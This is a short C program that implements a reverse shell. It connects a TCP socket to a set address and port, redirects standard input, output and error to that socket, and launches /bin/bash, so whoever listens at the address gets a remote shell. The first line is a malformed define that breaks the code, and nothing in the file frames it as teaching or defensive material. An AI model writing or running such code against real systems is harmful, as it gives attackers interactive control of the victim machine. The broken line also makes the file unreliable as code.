#define 127.0.0.1#define 4433
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define IP "127.0.0.1"
#define PORT 4444
int main(void){
    int port = PORT,
        sockt = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in revsockaddr;
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(IP);

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char *const argv[] = {"/bin/bash",NULL};

    execve("/bin/bash",argv,NULL);

    return 0;
}

